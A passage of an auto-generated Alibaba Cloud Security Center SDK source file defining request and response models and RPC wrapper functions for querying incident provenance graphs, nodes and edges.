async function queryIncidentSubNodesCount(request: QueryIncidentSubNodesCountRequest): QueryIncidentSubNodesCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryIncidentSubNodesCountWithOptions(request, runtime);
}

model QueryIncidentTracingDetailRequest {
  incidentId?: string(name='IncidentId', description='The ID of the event.

>  You can call the [DescribeCloudSiemEvents](https://help.aliyun.com/document_detail/2621307.html) operation to query the IDs of events.

This parameter is required.', example='184892fc5245b3ce8c3316434c94261f'),
}

model QueryIncidentTracingDetailResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='D2956025-4E5C-529D-92B4-B2591DDED067'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='True'),
  tracingDetail?: {
    edgeList?: [ 
      {
        aliuid?: string(name='Aliuid', description='The ID of the Alibaba Cloud account to which the current edge belongs.', example='1277498600854739'),
        endId?: string(name='EndId', description='The ID of the end node for the current edge.', example='223a185f05e5fc3c637'),
        endType?: string(name='EndType', description='The type of the end node for the current edge. Valid values include the following values:

*   **process**
*   **file**
*   **alert**
*   **ip**
*   **domain**', example='process_test_process'),
        name?: string(name='Name', description='The name of the current edge.', example='mongod'),
        origin?: string(name='Origin', description='The origin vertex ID of the current edge.', example='distribution'),
        properties?: string(name='Properties', description='The text that contains the properties of the current edge.', example='{\\\\"bandWidth\\\\":\\\\"8192\\\\",\\\\"internetIp\\\\":\\\\"8.211.13.50\\\\",\\\\"changeReason\\\\":\\\\"EIP_BIND\\\\",\\\\"bindInstanceId\\\\":\\\\"i-gw887xhzjvyjfv7vdfs3\\\\",\\\\"bindType\\\\":\\\\"EIP_ECS\\\\"}'),
        property?: map[string]any(name='Property', description='The property of the current edge.', example='{\\\\"coverage\\\\":\\\\"global\\\\"}'),
        ruleId?: string(name='RuleId', description='The ID of the rule based on which the current edge is generated.', example='136'),
        showType?: string(name='ShowType', description='The display type of the current edge.', example='0'),
        startId?: string(name='StartId', description='The ID of the start node for the current edge.', example='23003'),
        startType?: string(name='StartType', description='The type of the start node for the current edge. Valid values include the following values:

*   **process**
*   **file**
*   **alert**:
*   **ip**
*   **domain**', example='process'),
        time?: string(name='Time', description='The time when the current edge was created.', example='1652941117'),
        timestamp?: long(name='Timestamp', description='The UNIX timestamp when the current edge was created. Unit: milliseconds.', example='1636092632'),
        type?: string(name='Type', description='The type of the current edge. Valid values include the following values:

*   **process_exec_file**: The relationship indicates an executable file that is run by a process.
*   **process_connect_ip**: The relationship indicates an IP address that is connected by a process.
*   **domain_trgger_alert**: The relationship indicates an alert that is triggered for a domain name.', example='elf'),
        typeName?: string(name='TypeName', description='The type of the current edge.', example='cis'),
        updateTime?: string(name='UpdateTime', description='The time when the current edge was updated.', example='2022-01-13 12:49:33'),
        uuid?: string(name='Uuid', description='The UUID of the current edge. The SIEM system generates UUIDs for nodes and edges in the provenance graph to help you locate the nodes or edges.', example='678e29f4-d78f-4a7c-a2bc-38434a138538'),
      }
    ](name='EdgeList', description='The edges.'),
    entityTypeList?: [ 
      {
        currentVersionId?: string(name='CurrentVersionId', description='The version ID of the current entity.', example='1768'),
        displayColor?: string(name='DisplayColor', description='The display color of the current entity.', example='#FFF'),
        displayIcon?: string(name='DisplayIcon', description='The display icon of the current entity.', example='-'),
        displayOrder?: int32(name='DisplayOrder', description='The display sequence of the current entity.', example='2'),
        displayTemplate?: string(name='DisplayTemplate', description='The display template of the current entity.', example='[]'),
        gmtCreate?: string(name='GmtCreate', description='The time when the current entity was created.', example='2022-10-09T10:53Z'),
        gmtModified?: string(name='GmtModified', description='The time when the current entity was updated.', example='1585816811000'),
        id?: string(name='Id', description='The ID of the current entity.', example='1425'),
        isVirtualNode?: int32(name='IsVirtualNode', description='Indicates whether the entity is a virtual node. Valid values:

*   **1**: yes
*   **0**: no', example='1'),
        name?: string(name='Name', description='The type of the current entity. Valid values include the following values:

*   **process**
*   **file**
*   **alert**
*   **ip**
*   **domain**', example='auto-test-policy-name'),
        namespace?: string(name='Namespace', description='The namespace of the current entity.', example='78'),
        syncId?: int32(name='SyncId', description='The synchronization ID of the current entity.', example='e2fdf402-b4ed-4e1a-9e95-44d6069600b0'),
        traceSuccessFlag?: int32(name='TraceSuccessFlag', description='The tag that indicates whether tracing was successful. Valid values:

*   **1**: successful
*   **0**: failed', example='1'),
      }
    ](name='EntityTypeList', description='The entities.'),
    lang?: string(name='Lang', description='The rendering language of the returned result. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
    relationTypeList?: [ 
      {
        currentVersionId?: string(name='CurrentVersionId', description='The version ID of the current relationship.', example='1487'),
        directed?: int32(name='Directed', description='The direction of the current relationship. Valid values:

*   **1**: forward
*   **0**: reverse', example='1'),
        displayColor?: string(name='DisplayColor', description='The display color of the current relationship.', example='#FFF'),
        displayIcon?: string(name='DisplayIcon', description='The display icon of the current relationship.', example='https://img.alicdn.com/imgextra/i2/O1CN01jpZwD31G56XYPEJv2_!!600000000****-55-tps-25-28.svg'),
        displayTemplate?: string(name='DisplayTemplate', description='The display template of the current relationship.', example='[]'),
        gmtCreate?: string(name='GmtCreate', description='The time when the current relationship was created.', example='2022-09-23T10:50Z'),
        gmtModified?: string(name='GmtModified', description='The time when the current relationship was updated.', example='2022-07-12T07:58:49Z'),
        id?: string(name='Id', description='The ID of the current relationship.', example='1514'),
        name?: string(name='Name', description='The type of the current relationship. Valid values include the following values:

*   **process_exec_file**: The relationship indicates an executable file that is run by a process.
*   **process_connect_ip**: The relationship indicates an IP address that is connected by a process.
*   **domain_trgger_alert**: The relationship indicates an alert that is triggered for a domain name.', example='wusa'),
        namespace?: string(name='Namespace', description='The namespace of the current relationship.', example='default'),
        showType?: string(name='ShowType', description='The display type of the current relationship.', example='0'),
        syncId?: int32(name='SyncId', description='The synchronization ID of the current relationship.', example='sync-0000aws50gyy2ocisbmx'),
      }
    ](name='RelationTypeList', description='The relationships.'),
    vertexList?: [ 
      {
        aliuid?: string(name='Aliuid', description='The ID of the Alibaba Cloud account to which the current node belongs.', example='1487146717137516'),
        displayInfo?: [ 
          {
            name?: string(name='Name', description='The name of the property that needs to be displayed for the current node.', example='scan:ACSV-2020-111301'),
            value?: string(name='Value', description='The value of the property that needs to be displayed for the current node.', example='10.16.1'),
          }
        ](name='DisplayInfo', description='The display information of the current node.'),
        id?: string(name='Id', description='The ID of the current node.', example='383044'),
        lang?: string(name='Lang', description='The rendering language of the current node.', example='zh'),
        name?: string(name='Name', description='The name of the current node.', example='auto-test-attestor'),
        neighborList?: [ 
          {
            count?: int32(name='Count', description='The number of nodes.', example='0'),
            hasMore?: boolean(name='HasMore', description='Indicates whether more nodes are adjacent to the current node. Valid values:

*   **true**
*   **false**', example='True'),
            type?: string(name='Type', description='The type of the node. Valid values include the following values:

*   **process**
*   **file**
*   **alert**
*   **ip**
*   **domain**', example='2'),
          }
        ](name='NeighborList', description='The nodes that are adjacent to the current node.'),
        properties?: string(name='Properties', description='The text that contains the properties of the current node.', example='[{\\\\"PropertyValues\\\\": [{\\\\"PropertyValueId\\\\": 239, \\\\"PropertyValue\\\\": \\\\"121\\\\"}, {\\\\"PropertyValueId\\\\": 240, \\\\"PropertyValue\\\\": \\\\"6666\\\\"}], \\\\"PropertyKey\\\\": \\\\"22222222\\\\", \\\\"PropertyId\\\\": 203}]'),
        property?: map[string]any(name='Property', description='The property of the current node.', example='{\\\\"coverage\\\\":\\\\"global\\\\"}'),
        ruleId?: string(name='RuleId', description='The ID of the rule based on which the current node is generated.', example='301425'),
        time?: string(name='Time', description='The time when the current node was created.', example='2021-11-26'),
        timestamp?: long(name='Timestamp', description='The UNIX timestamp when the current node was created. Unit: milliseconds.', example='1663048980'),
        type?: string(name='Type', description='The type of the current node. Valid values include the following values:

*   **process**
*   **file**
*   **alert**
*   **ip**
*   **domain**', example='alidetect'),
        updateTime?: string(name='UpdateTime', description='The time when the current node was updated.', example='2022-01-13 12:49:33'),
        uuid?: string(name='Uuid', description='The UUID of the current node. The security information and event management (SIEM) system generates UUIDs for nodes and edges in the provenance graph to help you locate the nodes or edges.', example='32e36d8a-2b5d-4f71-98a8-12775685a3b4'),
      }
    ](name='VertexList', description='The nodes.'),
  }(name='TracingDetail', description='The information about the provenance graph.'),
}

model QueryIncidentTracingDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: QueryIncidentTracingDetailResponseBody(name='body'),
}

/**
 * @summary Queries the provenance graph of an event by using the event ID.
 *
 * @param request QueryIncidentTracingDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return QueryIncidentTracingDetailResponse
 */
async function queryIncidentTracingDetailWithOptions(request: QueryIncidentTracingDetailRequest, runtime: Util.RuntimeOptions): QueryIncidentTracingDetailResponse {
  Util.validateModel(request);
  var body : map[string]any = {};
  if (!Util.isUnset(request.incidentId)) {
    body['IncidentId'] = request.incidentId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'QueryIncidentTracingDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the provenance graph of an event by using the event ID.
 *
 * @param request QueryIncidentTracingDetailRequest
 * @return QueryIncidentTracingDetailResponse
 */
async function queryIncidentTracingDetail(request: QueryIncidentTracingDetailRequest): QueryIncidentTracingDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryIncidentTracingDetailWithOptions(request, runtime);
}

model QueryIncidentTracingJudgeRequest {
  incidentId?: string(name='IncidentId', description='The ID of the event that you want to query.

>  You can call the [DescribeCloudSiemEvents](https://help.aliyun.com/document_detail/2621307.html) operation to query the event ID.

This parameter is required.', example='d1d7a612-0dc2-413a-aa8e-9c7c88d8d12a'),
}

model QueryIncidentTracingJudgeResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='73563FEF-BBCB-151C-88AA-8A409CBAF0C6'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
  tracingJudge?: map[string]int32(name='TracingJudge', description='The request result.'),
}

model QueryIncidentTracingJudgeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: QueryIncidentTracingJudgeResponseBody(name='body'),
}

/**
 * @summary Queries whether an event has a provenance graph based on the event ID.
 *
 * @param request QueryIncidentTracingJudgeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return QueryIncidentTracingJudgeResponse
 */
async function queryIncidentTracingJudgeWithOptions(request: QueryIncidentTracingJudgeRequest, runtime: Util.RuntimeOptions): QueryIncidentTracingJudgeResponse {
  Util.validateModel(request);
  var body : map[string]any = {};
  if (!Util.isUnset(request.incidentId)) {
    body['IncidentId'] = request.incidentId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'QueryIncidentTracingJudge',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries whether an event has a provenance graph based on the event ID.
 *
 * @param request QueryIncidentTracingJudgeRequest
 * @return QueryIncidentTracingJudgeResponse
 */
async function queryIncidentTracingJudge(request: QueryIncidentTracingJudgeRequest): QueryIncidentTracingJudgeResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryIncidentTracingJudgeWithOptions(request, runtime);
}

model QueryIncidentVertexExtendInfoRequest {
  offset?: long(name='Offset', description='The page number. Valid values start from 1.', example='0'),
  relationType?: string(name='RelationType', description='The type of the edge that you want to query. Valid values include but are not limited to:

*   **process_exec_file:** A process executes a file.
*   **process_connect_ip:** A process connects to an IP address.
*   **domain_trgger_alert:** A domain name triggers an alert.

This parameter is required.', example='process_connect_ip'),
  size?: int32(name='Size', description='The number of entries per page. Valid values start from 1.', example='10'),
  vertexId?: string(name='VertexId', description='The ID of the node that you want to query.

>  You can call the [QueryIncidentTracingDetail](~~QueryIncidentTracingDetail~~) operation to query the node ID.

This parameter is required.', example='29872354f741b1b044b8a9b4e2ab0535'),
  vertexLabel?: string(name='VertexLabel', description='The node label. Valid values include but are not limited to:

*   **process**
*   **file**
*   **alert**
*   **ip**
*   **domain**

This parameter is required.', example='process'),
}

model QueryIncidentVertexExtendInfoResponseBody = {
  count?: string(name='Count', description='The total number of entries returned.', example='2'),
  requestId?: string(name='RequestId', description='The request ID.', example='0BCDBBF1-0048-535A-8529-67EA0CD1A807'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='True'),
  vertexExtendInfo?: [ 
    {
      aliuid?: string(name='Aliuid', description='The ID of the Alibaba Cloud account.', example='1168908270980461'),
      displayInfo?: [ 
        {
          name?: string(name='Name', description='The display name of the property.', example='IDA'),
          value?: string(name='Value', description='The display value of the property.', example='app:nxueo'),
        }
      ](name='DisplayInfo', description='The display information.'),
      id?: string(name='Id', description='The node ID.', example='1377'),
      lang?: string(name='Lang', description='The language of the content within the response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
      name?: string(name='Name', description='The node name.', example='oval:com.redhat.rhsa:def:20193878'),
      neighborList?: [ 
        {
          count?: int32(name='Count', description='The number of nodes.', example='2'),
          hasMore?: boolean(name='HasMore', description='Indicates whether more neighboring nodes exist. Valid values:

*   **true**
*   **false**', example='True'),
          type?: string(name='Type', description='The node type. Valid values include but are not limited to:

*   **process**
*   **file**
*   **alert**
*   **ip**
*   **domain**', example='alidetect'),
        }
      ](name='NeighborList', description='The neighboring nodes.'),
      properties?: string(name='Properties', description='The node properties. The value is in the text format.', example='DIRECTORY'),
      property?: {
        alertDesc?: string(name='AlertDesc', description='The alert description.', example='exploit'),
        alertDetail?: string(name='AlertDetail', description='The details of the alert.', example='{}'),
        alertLevel?: string(name='AlertLevel', description='The alert level. Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
        alertName?: string(name='AlertName', description='The alert name.', example='pt_device_in_bps_down_alert'),
        alertNameCode?: string(name='AlertNameCode', description='The code of the alert name.', example='6367'),
        alertNameEn?: string(name='AlertNameEn', description='The alert name. The value is in English.', example='attack_alert'),
        alertSrcProd?: string(name='AlertSrcProd', description='The service that generates the alert.', example='sas'),
        alertSrcProdModule?: string(name='AlertSrcProdModule', description='The module of the service that generates the alert.', example='aegis'),
        alertTitle?: string(name='AlertTitle', description='The alert title.', example='login_common_account'),
        alertType?: string(name='AlertType', description='The alert type.', example='attack_alert'),
        alertTypeCode?: string(name='AlertTypeCode', description='The code of the alert type.', example='112'),
        alertTypeEn?: string(name='AlertTypeEn', description='The alert type. The value is in English.', example='attack_alert'),
        alertUuid?: string(name='AlertUuid', description='The alert ID.', example='alert-abc4990f2e1948eb960a2bb7ac0****'),
        assetList?: string(name='AssetList', description='The assets.', example='[]'),
        attCk?: string(name='AttCk', description='ATT\\\\&CK', example='Keychain'),
        cloudCode?: string(name='CloudCode', description='The code of the cloud service provider.', example='alibaba_cloud'),
        entityList?: string(name='EntityList', description='The instance.', example='[
      "003d544744249351****"
]'),
        gmtCreate?: string(name='GmtCreate', description='The creation time.', example='2022-11-24T10:13Z'),
        gmtModified?: string(name='GmtModified', description='The modification time.', example='2023-05-08 20:06:07'),
        logTime?: string(name='LogTime', description='The time when the log was generated.', example='2022-11-24T10:13Z'),
        logUuid?: string(name='LogUuid', description='The log ID.', example='abc4990f2e1948eb960a2bb7ac0f****'),
        mainUserId?: string(name='MainUserId', description='The ID of the master account.', example='168370268****'),
        occurTime?: string(name='OccurTime', description='The time when the alert was generated.', example='2022-11-24T10:13Z'),
        subUserId?: string(name='SubUserId', description='The ID of the sub-account.', example='11689082709****'),
      }(name='Property', description='The node property.'),
      ruleId?: string(name='RuleId', description='The ID of the rule for which the node was created.', example='400035'),
      time?: string(name='Time', description='The time when the node was created.', example='2021-11-06 11:00:00'),
      timestamp?: long(name='Timestamp', description='The UNIX timestamp when the node was created. Unit: milliseconds.', example='1645168444'),
      type?: string(name='Type', description='The node type. Valid values include but are not limited to:

*   **process**
*   **file**
*   **alert**
*   **ip**
*   **domain**', example='cve'),
      uuid?: string(name='Uuid', description='The node UUID.', example='678e29f4-d78f-4a7c-a2bc-38434a138538'),
    }
  ](name='VertexExtendInfo', description='The returned extended information about the node.'),
}

model QueryIncidentVertexExtendInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: QueryIncidentVertexExtendInfoResponseBody(name='body'),
}

/**
 * @summary Queries the extended information about an event node.
 *
 * @param request QueryIncidentVertexExtendInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return QueryIncidentVertexExtendInfoResponse
 */
async function queryIncidentVertexExtendInfoWithOptions(request: QueryIncidentVertexExtendInfoRequest, runtime: Util.RuntimeOptions): QueryIncidentVertexExtendInfoResponse {
  Util.validateModel(request);
  var body : map[string]any = {};
  if (!Util.isUnset(request.offset)) {
    body['Offset'] = request.offset;
  }
  if (!Util.isUnset(request.relationType)) {
    body['RelationType'] = request.relationType;
  }
  if (!Util.isUnset(request.size)) {
    body['Size'] = request.size;
  }
  if (!Util.isUnset(request.vertexId)) {
    body['VertexId'] = request.vertexId;
  }
  if (!Util.isUnset(request.vertexLabel)) {
    body['VertexLabel'] = request.vertexLabel;
  }
  var req = new OpenApi.OpenApiRequest{ 
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'QueryIncidentVertexExtendInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the extended information about an event node.
 *
 * @param request QueryIncidentVertexExtendInfoRequest
 * @return QueryIncidentVertexExtendInfoResponse
 */
async function queryIncidentVertexExtendInfo(request: QueryIncidentVertexExtendInfoRequest): QueryIncidentVertexExtendInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryIncidentVertexExtendInfoWithOptions(request, runtime);
}

model QueryIncidentVertexNodesRequest {
  edgeLabelList?: [ string ](name='EdgeLabelList', description='The types of the edges that you want to query.'),
  offset?: long(name='Offset', description='The page number. Valid values start from 1.', example='0'),
  size?: int32(name='Size', description='The number of entries per page. Valid values start from 1.', example='10'),
  vertexId?: string(name='VertexId', description='The ID of the node that you want to query.

>  You can call the [QueryIncidentTracingDetail](~~QueryIncidentTracingDetail~~) operation to query the node ID.

This parameter is required.', example='d6d7738a34cc252219866d223c0093f8'),
  vertexLabel?: string(name='VertexLabel', description='The node label. Valid values include but are not limited to:

*   **process**
*   **file**
*   **alert**
*   **ip**
*   **domain**

This parameter is required.', example='process'),
}

model QueryIncidentVertexNodesShrinkRequest {
  edgeLabelListShrink?: string(name='EdgeLabelList', description='The types of the edges that you want to query.'),
  offset?: long(name='Offset', description='The page number. Valid values start from 1.', example='0'),
  size?: int32(name='Size', description='The number of entries per page. Valid values start from 1.', example='10'),
  vertexId?: string(name='VertexId', description='The ID of the node that you want to query.

>  You can call the [QueryIncidentTracingDetail](~~QueryIncidentTracingDetail~~) operation to query the node ID.

This parameter is required.', example='d6d7738a34cc252219866d223c0093f8'),
  vertexLabel?: string(name='VertexLabel', description='The node label. Valid values include but are not limited to:

*   **process**
*   **file**
*   **alert**
*   **ip**
*   **domain**

This parameter is required.', example='process'),
}

model QueryIncidentVertexNodesResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='ACF97412-FD09-4D1F-994F-34DF12BREF20'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
  vertexNodes?: {
    edgeList?: [ 
      {
        aliuid?: string(name='Aliuid', description='The ID of the Alibaba Cloud account to which the edge belongs.', example='20973951'),
        endId?: string(name='EndId', description='The ID of the end node for the edge.', example='64002'),
        endType?: string(name='EndType', description='The type of the end node for the edge. Valid values include but are not limited to:

*   **process**
*   **file**
*   **alert**
*   **ip**
*   **domain**', example='file'),
        name?: string(name='Name', description='The name of the edge.', example='jdk'),
        origin?: string(name='Origin', description='The original name of the edge.', example='distribution'),
        properties?: string(name='Properties', description='The properties of the edge. The value is in the text format.', example='{\\\\"bandWidth\\\\":\\\\"7810048\\\\",\\\\"internetIp\\\\":\\\\"47.57.13.255\\\\",\\\\"changeReason\\\\":\\\\"MODIFY_SPEC\\\\",\\\\"bindInstanceId\\\\":\\\\"i-j6chvo01tle7qfnhewr3\\\\",\\\\"bindType\\\\":\\\\"EIP_ECS\\\\"}'),
        property?: map[string]any(name='Property', description='The property of the edge.'),
        ruleId?: string(name='RuleId', description='The ID of the rule based on which the edge was created.', example='368'),
        showType?: string(name='ShowType', description='The display type of the edge.', example='type'),
        startId?: string(name='StartId', description='The ID of the start node for the edge.', example='52003'),
        startType?: string(name='StartType', description='The type of the start node for the edge. Valid values include but are not limited to:

*   **process**
*   **file**
*   **alert**
*   **ip**
*   **domain**', example='process'),
        time?: string(name='Time', description='The time when the edge was created.', example='2021-11-06 11:00:00'),
        timestamp?: long(name='Timestamp', description='The time when the edge was created. This value is a UNIX timestamp representing the number of milliseconds that have elapsed since January 1, 1970, 00:00:00 UTC.', example='1645168444'),
        type?: string(name='Type', description='The type of the edge.', example='cve'),
        typeName?: string(name='TypeName', description='The type name of the edge.', example='weak_password'),
        updateTime?: string(name='UpdateTime', description='The time when the edge was updated.', example='2021-12-16T07:20:33.000Z'),
        uuid?: string(name='Uuid', description='The UUID of the edge.', example='549237d6-86d1-47f6-9ffa-3f97da9e6b10'),
      }
    ](name='EdgeList', description='The edges that are returned.'),
    entityTypeList?: [ 
      {
        currentVersionId?: string(name='CurrentVersionId', description='The version of the entity.', example='993'),
        displayColor?: string(name='DisplayColor', description='The display color of the entity.', example='red'),
        displayIcon?: string(name='DisplayIcon', description='The display icon of the entity.', example='http://img.22222.com'),
        displayOrder?: int32(name='DisplayOrder', description='The display order of the entity.', example='01'),
        displayTemplate?: string(name='DisplayTemplate', description='The display template of the entity.', example='template1'),
        gmtCreate?: string(name='GmtCreate', description='The time when the entity was created.', example='2022-09-23T10:50Z'),
        gmtModified?: string(name='GmtModified', description='The time when the entity was updated.', example='1623317089000'),
        id?: string(name='Id', description='The ID of the entity.', example='33926'),
        isVirtualNode?: int32(name='IsVirtualNode', description='Indicates whether the entity is a virtual node.', example='true'),
        name?: string(name='Name', description='The name of the entity.', example='auto-test-policy-name'),
        namespace?: string(name='Namespace', description='The namespace of the entity.', example='78'),
        syncId?: int32(name='SyncId', description='The synchronization ID of the entity.', example='3212024a-1816-46d5-b286-e5d5780fd778'),
        traceSuccessFlag?: int32(name='TraceSuccessFlag', description='Indicates whether the entity is traced. Valid values:

*   **1**: The entity is traced.
*   **0**: The entity fails to be traced.', example='true'),
      }
    ](name='EntityTypeList', description='The entities that are returned.'),
    lang?: string(name='Lang', description='The language of the content within the request. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
    relationTypeList?: [ 
      {
        currentVersionId?: string(name='CurrentVersionId', description='The version of the relationship.', example='1487'),
        DIsplayIcon?: string(name='DIsplayIcon', description='The display icon of the relationship.', example='http://img.33.com'),
        directed?: int32(name='Directed', description='The direction of the relationship. Valid values:

*   **1**: forward.
*   **0**: reverse.', example='in'),
        displayColor?: string(name='DisplayColor', description='The display color of the relationship.', example='red'),
        displayTemplate?: string(name='DisplayTemplate', description='The display template of the relationship.', example='template1'),
        gmtCreate?: string(name='GmtCreate', description='The time when the relationship was created.', example='2022-08-02T10:20Z'),
        gmtModified?: string(name='GmtModified', description='The time when the relationship was updated.', example='1637556498000'),
        id?: string(name='Id', description='The ID of the relationship.', example='9350'),
        name?: string(name='Name', description='The name of the relationship.', example='mongod'),
        namespace?: string(name='Namespace', description='The namespace of the relationship.', example='default'),
        showType?: string(name='ShowType', description='The display type of the relationship.', example='type1'),
        syncId?: int32(name='SyncId', description='The synchronization ID of the relationship.', example='a45185c7-b1b8-4a49-b04a-d6bfa051ef0e'),
      }
    ](name='RelationTypeList', description='The relationships that are returned.'),
    vertexList?: [ 
      {
        aliuid?: string(name='Aliuid', description='The ID of the Alibaba Cloud account to which the node belongs.', example='20973951'),
        displayInfo?: [ 
          {
            name?: string(name='Name', description='The display name of the property.', example='zabbix'),
            value?: string(name='Value', description='The display value of the property.', example='cs-nacos'),
          }
        ](name='DisplayInfo', description='The display information of the node.'),
        id?: string(name='Id', description='The ID of the node.', example='225'),
        lang?: string(name='Lang', description='The display language of the neighboring node. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
        name?: string(name='Name', description='The name of the node.', example='zabbix'),
        neighborList?: [ 
          {
            count?: int32(name='Count', description='The number of neighboring nodes.', example='27'),
            hasMore?: boolean(name='HasMore', description='Indicates whether more neighboring nodes exist. Valid values:

*   **true**
*   **false**', example='False'),
            type?: string(name='Type', description='The type of the neighboring node. Valid values include but are not limited to:

*   **process**
*   **file**
*   **alert**
*   **ip**
*   **domain**', example='elf'),
          }
        ](name='NeighborList', description='The neighboring nodes of the node.'),
        properties?: string(name='Properties', description='The properties of the node. The value is in the text format.', example='{\\\\"bandWidth\\\\":\\\\"5120\\\\",\\\\"internetIp\\\\":\\\\"47.242.191.206\\\\",\\\\"changeReason\\\\":\\\\"EIP_BIND\\\\",\\\\"bindInstanceId\\\\":\\\\"eci-j6ci7lvci50rore7dkv8\\\\",\\\\"bindType\\\\":\\\\"EIP_ECS\\\\"}'),
        property?: map[string]any(name='Property', description='The property of the node.'),
        ruleId?: string(name='RuleId', description='The ID of the rule based on which the node was created.', example='171'),
        time?: string(name='Time', description='The time when the node was created.', example='1636081135'),
        timestamp?: long(name='Timestamp', description='The time when the node was created. This value is a UNIX timestamp representing the number of milliseconds that have elapsed since January 1, 1970, 00:00:00 UTC.', example='1645179073'),
        type?: string(name='Type', description='The type of the node. Valid values include but are not limited to:

*   **process**
*   **file**
*   **alert**
*   **ip**
*   **domain**', example='sys'),
        updateTime?: string(name='UpdateTime', description='The time when the node was updated.', example='2021-12-16T07:20:33.000Z'),
        uuid?: string(name='Uuid', description='The UUID of the node.', example='02ca8614-ecdb-44d3-b3d0-158655080e4f'),
      }
    ](name='VertexList', description='The information about the node.'),
  }(name='VertexNodes', description='The results that are returned.'),
}

model QueryIncidentVertexNodesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: QueryIncidentVertexNodesResponseBody(name='body'),
}

/**
 * @summary Queries the detailed information about an event node.
 *
 * @param tmpReq QueryIncidentVertexNodesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return QueryIncidentVertexNodesResponse
 */
async function queryIncidentVertexNodesWithOptions(tmpReq: QueryIncidentVertexNodesRequest, runtime: Util.RuntimeOptions): QueryIncidentVertexNodesResponse {
  Util.validateModel(tmpReq);
  var request = new QueryIncidentVertexNodesShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.edgeLabelList)) {
    request.edgeLabelListShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.edgeLabelList, 'EdgeLabelList', 'simple');
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.edgeLabelListShrink)) {
    body['EdgeLabelList'] = request.edgeLabelListShrink;
  }
  if (!Util.isUnset(request.offset)) {
    body['Offset'] = request.offset;
  }
  if (!Util.isUnset(request.size)) {
    body['Size'] = request.size;
  }
  if (!Util.isUnset(request.vertexId)) {
    body['VertexId'] = request.vertexId;
  }
  if (!Util.isUnset(request.vertexLabel)) {
    body['VertexLabel'] = request.vertexLabel;
  }
  var req = new OpenApi.OpenApiRequest{ 
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'QueryIncidentVertexNodes',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the detailed information about an event node.
 *
 * @param request QueryIncidentVertexNodesRequest
 * @return QueryIncidentVertexNodesResponse
 */
async function queryIncidentVertexNodes(request: QueryIncidentVertexNodesRequest): QueryIncidentVertexNodesResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryIncidentVertexNodesWithOptions(request, runtime);
}

model QueryJenkinsImageRegistryPersistenceDayRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='113.83.XXX.XXX'),
}

model QueryJenkinsImageRegistryPersistenceDayResponseBody = {
  data?: int32(name='Data', description='The retention period. Unit: days.', example='30'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='EA4AC8B7-0C18-5BC1-9DA4-798B3BE4****'),
  timeCost?: long(name='TimeCost', description='The time consumed. Unit: seconds.', example='1'),
}

